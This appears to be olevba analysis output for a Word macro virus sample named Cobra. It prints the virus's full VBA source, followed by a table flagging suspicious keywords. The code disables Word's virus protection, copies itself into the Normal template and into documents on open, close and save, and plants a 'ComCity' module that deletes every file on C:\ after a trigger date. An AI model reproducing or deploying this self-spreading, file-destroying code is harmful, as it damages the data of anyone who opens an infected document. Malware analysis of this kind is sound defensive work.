olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra.bas 
in file: ./Virus.MSWord.Cobra - OLE stream: 'Macros/VBA/Cobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 1.0B
Sub AutoOpen()
With Options
.VirusProtection = False
.SaveNormalPrompt = False
.ConfirmConversions = False
End With
MacCopToNor
MacCopToAp
End Sub
Sub MacCopToNor()
For Each ModOk In NormalTemplate.VBProject.VBComponents
If ModOk.Name = "Cobra" Then
Exit Sub
End If
Next
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="Cobra", _
Object:=wdOrganizerObjectProjectItems
End Sub
Sub MacCopToAp()
For Each ModOk In ActiveDocument.VBProject.VBComponents
If ModOk.Name = "Cobra" Then
Exit Sub
End If
Next
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, Name:="Cobra", _
Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoClose()
If Month(Now) = 9 And Day(Now) = 11 Then
If Documents.Count > 0 Then
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> "'Cobra Version 1.0B" Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, "'Cobra Version 1.0B"
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 2, "Sub FileExit"
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 3, "MsgBox " + """You are infected with Cobra""" + ",," + """Cobra"""
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 4, "WordBasic.FileExit"
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 5, "End Sub"
End If
End If
End If
End Sub
Sub FileClose()
MacCopToNor
MacCopToAp
WordBasic.FileClose
End Sub
Sub FileSave()
MacCopToNor
MacCopToAp
If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
For Each ModOk In ActiveDocument.VBProject.VBComponents
If ModOk.Name = "ComCity" Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, _
Name:="ComCity", Object:=wdOrganizerObjectProjectItems
Exit Sub
End If
Next
Set ModAdd = ActiveDocument.VBProject.VBComponents.Add(1)
ModAdd.Name = "ComCity"
ModAdd.CodeModule.InsertLines 1, "Sub FileNew"
ModAdd.CodeModule.InsertLines 2, "On Error Resume Next"
ModAdd.CodeModule.InsertLines 3, "dialogs(wdDialogFileNew).Show"
ModAdd.CodeModule.InsertLines 4, "If day(now)>11  and month(now)>=10 then"
ModAdd.CodeModule.InsertLines 5, "Kill " + """c:\*.*"""
ModAdd.CodeModule.InsertLines 6, "End if"
ModAdd.CodeModule.InsertLines 7, "End Sub"
End Sub

-------------------------------------------------------------------------------
VBA MACRO ComCity.bas 
in file: ./Virus.MSWord.Cobra - OLE stream: 'Macros/VBA/ComCity'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
If Day(Now) > 11 And Month(Now) >= 10 Then
Kill "c:\*.*"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

